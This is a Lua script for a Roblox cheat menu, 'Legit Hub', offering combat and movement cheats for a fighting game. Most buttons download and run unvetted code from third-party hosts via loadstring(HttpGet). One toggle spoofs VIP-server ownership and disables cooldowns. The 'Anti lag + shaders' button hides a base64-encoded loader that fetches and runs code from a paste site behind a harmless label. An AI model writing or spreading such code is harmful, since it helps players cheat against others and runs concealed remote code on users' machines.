local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

local Window = WindUI:CreateWindow({
    Title = "Legit Hub",
    Icon = "skull",
    Author = "Shivraj",
    Folder = "LegitHub",
    Size = UDim2.fromOffset(550, 450),
    MinSize = Vector2.new(450, 350),
    Theme = "Dark",
    Resizable = true,
    SideBarWidth = 220,
    HideSearchBar = false,

    -- Bright blue background (strong cyan-blue tone)
    Background = Color3.fromHex("#00BFFF"),  -- DeepSkyBlue / bright cyan-blue
    -- Alternative brighter/more neon versions:
    -- Background = Color3.fromHex("#00FFFF"),   -- pure cyan
    -- Background = Color3.fromHex("#1E90FF"),   -- DodgerBlue
})

-- Bright blue accent tags
Window:Tag({ Title = "Bright Blue Edition", Color = Color3.fromHex("#00BFFF") })
Window:Tag({ Title = "v1.0", Color = Color3.fromHex("#00D4FF") })  -- lighter blue variant

-- Uppercut Techs tab
local UppercutTab = Window:Tab({ Title = "Uppercut Techs", Icon = "zap" })

UppercutTab:Button({ Title = "King tech", Callback = function() loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/db1e974cdf7fab0c8fc113c38350c94ed7d7466d617bb372e44f6acdd5fce0ea/download"))() end })
UppercutTab:Button({ Title = "Lix tech", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dinhthanhtuankiet1762009-sudo/Js/refs/heads/main/aca40cf1f24c92f1.lua.txt"))() end })
UppercutTab:Button({ Title = "Loop dash", Callback = function() loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/28513f51c0ca2c03d4d7d94f59215d13ce1a2a470bf187f0a685b58ccb4dae98/download"))() end })
UppercutTab:Button({ Title = "Lee instant twisted", Callback = function() loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/6c153e601475b17b12d0c5f1f295f2bdb2efd2c13aa92d93e0588ba7b4a34d7e.lua"))() end })

-- Lethal Techs tab
local LethalTab = Window:Tab({ Title = "Lethal techs", Icon = "skull" })

LethalTab:Button({ Title = "Instant lethal", Callback = function() loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57a4d240a2440f0450986c966469092ccfb8d4797392cb8f469fa8b6e605e64d/download"))() end })

-- Movement Techs tab
local MovementTab = Window:Tab({ Title = "Movement techs", Icon = "activity" })

MovementTab:Button({ Title = "Backdash", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dinhthanhtuankiet1762009-sudo/Js/refs/heads/main/4418648b0e9b71ef.lua"))() end })
MovementTab:Button({ Title = "Side dash assist", Callback = function() loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/23bcf4264b586dc93b16a9b054eddae259938b7421ac5096353079b2e9d74e24.lua"))() end })
MovementTab:Button({ Title = "Auto block", Callback = function() loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/5659752fa0f7c10df56777eafd8f4813f15d3cde1b206f7e10f6b87af4fa9dfd/download"))() end })

local noDashConn
MovementTab:Toggle({
    Title = "No side dash cooldown",
    Default = false,
    Callback = function(value)
        if value then
            loadstring[[local g=game;local w=g:GetService("Workspace");local p=g:GetService("Players");local r=g:GetService("RunService");local l=p.LocalPlayer;if w:GetAttribute("NoDashCooldown")==nil then w:SetAttribute("NoDashCooldown",false)end;if w:GetAttribute("NoFatigue")==nil then w:SetAttribute("NoFatigue",false)end;w:SetAttribute("VIPServer",tostring(l.UserId));w:SetAttribute("VIPServerOwner",l.Name);l:SetAttribute("NoDashCooldown",true);r.Heartbeat:Connect(function()w:SetAttribute("NoDashCooldown",true)w:SetAttribute("NoFatigue",true)w:SetAttribute("Fatigue",0)l:SetAttribute("NoDashCooldown",true)end);print("✅ No Side Dash Cooldown ACTIVE! Spam Q+A/D forever! 🔥")]]()
        end
    end,
})

-- Misc tab
local MiscTab = Window:Tab({ Title = "Misc", Icon = "settings" })

MiscTab:Button({ Title = "Fps unlocker", Callback = function() if setfpscap then setfpscap(0) end end })
MiscTab:Button({
    Title = "Anti lag + shaders",
    Callback = function()
        local a = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8v"
        local b = "cGFzdGVmeS5hcHAvWmJGdWNTSVIvcmF3IikpKCk="
        loadstring(crypt.base64.decode(a..b))()
    end,
})

-- Credits tab
local CreditsTab = Window:Tab({ Title = "Credits", Icon = "heart" })

CreditsTab:Paragraph({
    Title = "Script Credits",
    Desc = [[
This script GUI is made by AI
All the techs are made by other scripters

Creds:
- Merebennie Hub
- Yqtang

I have just combined the best scripts which are all keyless and look legit.
Only the side dash is a bit blatant.

Anyways guys, join their Discord!
They make cool scripts 🔥

Merebennie Discord: https://discord.gg/merebennie

Yqtang Discord: https://discord.gg/T3ymkJyfm
    ]],
})

CreditsTab:Button({
    Title = "Copy Merebennie Discord Link",
    Callback = function()
        setclipboard("https://discord.gg/merebennie")
        WindUI:Notify({ Title = "Copied!", Content = "Merebennie Discord link copied!", Duration = 4 })
    end,
})

CreditsTab:Button({
    Title = "Copy Yqtang Discord Link",
    Callback = function()
        setclipboard("https://discord.gg/T3ymkJyfm")
        WindUI:Notify({ Title = "Copied!", Content = "Yqtang Discord link copied!", Duration = 4 })
    end,
})